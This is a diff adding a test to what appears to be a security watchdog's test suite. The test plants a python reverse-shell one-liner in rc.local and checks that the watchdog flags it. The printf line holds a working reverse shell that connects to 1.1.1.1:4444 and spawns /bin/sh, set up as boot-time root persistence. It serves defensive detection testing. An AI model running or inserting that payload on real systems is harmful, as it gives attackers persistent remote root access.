@@ -304,3 +304,19 @@ seed_benign() {
     # (acceptable — new file surfaces in delta sample).
     cap | grep -qE '"severity":"(alert|warn|ok)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on boot-script surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the boot-time
+    # rc.local root-exec persistence surface (T1037 — rc.local
+    # runs AS ROOT on every boot; on systemd hosts rc-local.
+    # service can be enabled to revive this legacy path).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${RCFILE}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
